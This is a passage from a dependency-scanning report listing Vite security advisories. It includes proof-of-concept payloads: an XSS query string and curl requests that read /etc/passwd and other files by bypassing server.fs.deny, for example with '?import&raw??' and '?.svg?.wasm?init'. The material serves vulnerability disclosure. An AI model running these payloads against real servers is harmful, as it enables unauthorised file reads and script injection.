https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/packages/vite/src/node/plugins/html.ts#L429-L465

When `appType: &apos;spa&apos; | &apos;mpa&apos;`, Vite serves HTML itself, and `htmlFallbackMiddleware` rewrites `req.url` to the canonical path of `index.html`,

https://github.com/vitejs/vite/blob/73ef074b80fa7252e0c46a37a2c94ba8cba46504/packages/vite/src/node/server/middlewares/htmlFallback.ts#L44-L47

so the `url` passed to `server.transformIndexHtml` is `/index.html`.

However, if `appType: &apos;custom&apos;`, HTML is served manually, and if `server.transformIndexHtml` is called with the unmodified request URL (as the SSR docs suggest), then the path of the transformed `html-proxy` script varies with the request URL. For example, a request with path `/` produces

```html
&lt;script type=&quot;module&quot; src=&quot;/@id/__x00__/index.html?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
```

It is possible to abuse this behavior by crafting a request URL to contain a malicious payload like

```
&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&apos;boom&apos;)&lt;/script&gt;
```

so a request to http://localhost:5173/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E produces HTML output like

```html
&lt;script type=&quot;module&quot; src=&quot;/@id/__x00__/?&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(&quot;boom&quot;)&lt;/script&gt;?html-proxy&amp;index=0.js&quot;&gt;&lt;/script&gt;
```

which demonstrates XSS.

### PoC

- Example 1. Serving HTML from `vite dev` middleware with `appType: &apos;custom&apos;`
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=dev-html
    - &quot;Open in New Tab&quot;
    - Edit URL to set query string to `?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E` and navigate
    - Witness XSS:
    - ![image](https://user-images.githubusercontent.com/2456381/287434281-13757894-7a63-4a73-b1e9-d2b024c19d14.png)
- Example 2. Serving HTML from SSR-style Express server (Vite dev server runs in middleware mode):
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=server
    - (Same steps as above)
- Example 3. Plain `vite dev` (this shows that vanilla `vite dev` is _not_ vulnerable, provided `htmlFallbackMiddleware` is used)
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&amp;terminal=dev
    - (Same steps as above)
    - You should _not_ see the alert box in this case

### Detailed Impact

This will probably predominantly affect [development-mode SSR](https://vitejs.dev/guide/ssr#setting-up-the-dev-server), where `vite.transformHtml` is called using the original `req.url`, per the docs:

https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/docs/guide/ssr.md?plain=1#L114-L126

However, since this vulnerability affects `server.transformIndexHtml`, the scope of impact may be higher to also include other ad-hoc calls to `server.transformIndexHtml` from outside of Vite&apos;s own codebase.

My best guess at bisecting which versions are vulnerable involves the following test script

```js
import fs from &apos;node:fs/promises&apos;;
import * as vite from &apos;vite&apos;;

const html = `
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot; /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script type=&quot;module&quot;&gt;
      // Inline script
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
`;
const server = await vite.createServer({ appType: &apos;custom&apos; });
const transformed = await server.transformIndexHtml(&apos;/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E&apos;, html);
console.log(transformed);
await server.close();
```

and using it I was able to narrow down to #13581. If this is correct, then vulnerable Vite versions are 4.4.0-beta.2 and higher (which includes 4.4.0).</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/advisories/GHSA-92r3-m2mg-pj97</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-49293</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-49293</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\=4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2025-46565</name><severity>MEDIUM</severity><cvssV2><score>6.0</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-22</cwe></cwes><description>Vite is a frontend tooling framework for javascript. Prior to versions 6.3.4, 6.2.7, 6.1.6, 5.4.19, and 4.5.14, the contents of files in the project root that are denied by a file matching pattern can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected. Only files that are under project root and are denied by a file matching pattern can be bypassed. `server.fs.deny` can contain patterns matching against files (by default it includes .env, .env.*, *.{crt,pem} as such patterns). These patterns were able to bypass for files under `root` by using a combination of slash and dot (/.). This issue has been patched in versions 6.3.4, 6.2.7, 6.1.6, 5.4.19, and 4.5.14.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-46565?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-46565] CWE-22: Improper Limitation of a Pathname to a Restricted Directory (&apos;Path Traversal&apos;)</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-859w-5945-r5v3</url><name>https://github.com/advisories/GHSA-859w-5945-r5v3</name></reference><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/pull/5420</url><name>https://github.com/vitejs/vite/pull/5420</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-46565</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-46565</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-31207</name><severity>MEDIUM</severity><cvssV3><baseScore>5.900000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>Vite (French word for &quot;quick&quot;, pronounced /vit/, like &quot;veet&quot;) is a frontend build tooling to improve the frontend development experience.`server.fs.deny` does not deny requests for patterns with directories. This vulnerability has been patched in version(s) 5.2.6, 5.1.7, 5.0.13, 4.5.3, 3.2.10 and 2.9.18.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-31207?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-31207] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-31207</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-31207</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/advisories/GHSA-8jhw-289h-jh2g</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2025-24010</name><severity>MEDIUM</severity><cvssV2><score>5.900000095367432</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-1385</cwe></cwes><description>Vite is a frontend tooling framework for javascript. Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections. This vulnerability is fixed in 6.0.9, 5.4.12, and 4.5.6.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-24010?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-24010] CWE-1385 CWE-346 CWE-350</name></reference><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-24010</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-24010</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2025-31486</name><severity>MEDIUM</severity><cvssV2><score>5.900000095367432</score><accessVector>NETWORK</accessVector><accessComplexity>HIGH</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-200</cwe></cwes><description>Vite is a frontend tooling framework for javascript. The contents of arbitrary files can be returned to the browser. By adding ?.svg with ?.wasm?init or with sec-fetch-dest: script header, the server.fs.deny restriction was able to bypass. This bypass is only possible if the file is smaller than build.assetsInlineLimit (default: 4kB) and when using Vite 6.0+. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected. This vulnerability is fixed in 4.5.12, 5.4.17, 6.0.14, 6.1.4, and 6.2.5.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2025-31486?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2025-31486] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-31486</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2025-31486</name></reference><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-8jhw-289h-jh2g</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.900000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.

### Impact
Only apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Patches
Fixed in vite@5.2.6, vite@5.1.7, vite@5.0.13, vite@4.5.3, vite@3.2.10, vite@2.9.18

### Details
`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.

**Reproduction**

Set fs.deny to `[&apos;**/.git/**&apos;]` and then curl for `/.git/config`.

* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).
* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).
</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67</url><name>https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-31207</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-31207</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0</url><name>https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649</url><name>https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-8jhw-289h-jh2g</url><name>https://github.com/advisories/GHSA-8jhw-289h-jh2g</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258</url><name>https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9</url><name>https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48</url><name>https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-4r4m-qw57-chr8</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary

The contents of arbitrary files can be returned to the browser.

### Impact
Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details

- base64 encoded content of non-allowed files is exposed using `?inline&amp;import` (originally reported as `?import&amp;?inline=1.wasm?init`)
- content of non-allowed files is exposed using `?raw?import`

`/@fs/` isn&apos;t needed to reproduce the issue for files inside the project root.

### PoC

Original report (check details above for simplified cases):

The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice
```
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
```

Example full URL `http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init`</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-4r4m-qw57-chr8</url><name>https://github.com/advisories/GHSA-4r4m-qw57-chr8</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</url><name>https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-31125</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-31125</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;4.5.11:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-9cwx-2883-4wfx</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
The contents of arbitrary files can be returned to the browser.

### Details
`@fs` denies access to files outside of Vite serving allow list. Adding `?import&amp;raw` to the URL bypasses this limitation and returns the file content if it exists.

### PoC
```sh
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo &quot;top secret content&quot; &gt; /tmp/secret.txt

# expected behaviour
$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt&quot;

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw&quot;
export default &quot;top secret content\n&quot;
//# sourceMappingURL=data:application/json;base64,eyJ2...
```

</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-45811</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-45811</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</url><name>https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</url><name>https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</url><name>https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</url><name>https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</url><name>https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-9cwx-2883-4wfx</url><name>https://github.com/advisories/GHSA-9cwx-2883-4wfx</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-x574-m823-4x7w</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
The contents of arbitrary files can be returned to the browser.

### Impact
Only apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details
`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&amp;raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.

### PoC
```bash
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo &quot;top secret content&quot; &gt; /tmp/secret.txt

# expected behaviour
$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt&quot;

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??&quot;
export default &quot;top secret content\n&quot;
//# sourceMappingURL=data:application/json;base64,eyJ2...
```</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-30208</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-30208</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</url><name>https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</url><name>https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</url><name>https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</url><name>https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-x574-m823-4x7w</url><name>https://github.com/advisories/GHSA-x574-m823-4x7w</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</url><name>https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;4.5.10:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-xcj6-pq6g-qj4x</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-200</cwe></cwes><description>### Summary

The contents of arbitrary files can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.

### Details

#### `.svg`

Requests ending with `.svg` are loaded at this line.
https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290
By adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.

This bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.

#### relative paths

The check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).

### PoC

```bash
npm create vite@latest
cd vite-project/
npm install
npm run dev
```

send request to read `etc/passwd`

```bash
curl &apos;http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init&apos;
```

```bash
curl &apos;http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw&apos;
```</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</url><name>https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-31486</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-31486</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</url><name>https://github.com/advisories/GHSA-xcj6-pq6g-qj4x</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</url><name>https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;4.5.12:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-45812</name><severity>MEDIUM</severity><cvssV2><score>5.099999904632568</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>MEDIUM</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-79</cwe></cwes><description>Vite a frontend build tooling framework for javascript. Affected versions of vite were discovered to contain a DOM Clobbering vulnerability when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present. DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`. However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server. This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes. This issue has been patched in versions 5.4.6, 5.3.6, 5.2.14, 4.5.5, and 3.2.11. Users are advised to upgrade. There are no known workarounds for this vulnerability.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45812</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45812</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/advisories/GHSA-64vr-g452-qvp3</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-45812?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-45812] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-356w-63v5-8wf4</name><severity unscored="true">moderate</severity><cwes><cwe>CWE-200</cwe></cwes><description>### Summary
